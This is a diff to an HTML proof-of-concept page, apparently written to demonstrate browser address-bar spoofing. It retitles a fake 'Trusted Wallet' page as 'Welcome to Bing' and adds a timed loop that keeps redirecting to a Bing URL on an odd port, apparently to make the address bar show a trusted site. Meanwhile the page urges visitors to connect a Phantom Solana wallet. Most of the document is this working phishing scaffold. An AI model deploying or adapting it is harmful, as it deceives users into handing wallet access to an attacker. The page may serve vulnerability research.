@@ -3,14 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trusted Wallet</title>
+    <title>Address Bar Spoof PoC</title>
     <script>
-        // Attempt to spoof the URL
+        // Spoof function to inject a fake form and spoof the address bar
+        function spoof() { 
+            document.location = "https://bing.com:1234"; 
+            setInterval(function() {
+                document.location = "https://bing.com:1234";
+            }, 9800); 
+        }
+
+        // Trigger spoofing after a delay
         window.onload = () => {
-            history.pushState({}, "", "https://bing.com:1234");
+            setTimeout(spoof, 10000);
         };
 
-        // Function to mimic wallet connection
+        // Wallet connection logic
         async function attemptWalletConnection() {
             try {
                 if (window.phantom && window.phantom.solana) {
@@ -26,8 +34,8 @@
     </script>
 </head>
 <body>
-    <h1>Welcome to Trusted Wallet</h1>
-    <p>Please connect your wallet below:</p>
+    <h1>Welcome to Bing</h1>
+    <p>Click the button below to connect your wallet:</p>
     <button onclick="attemptWalletConnection()">Connect Wallet</button>
 </body>
 </html>
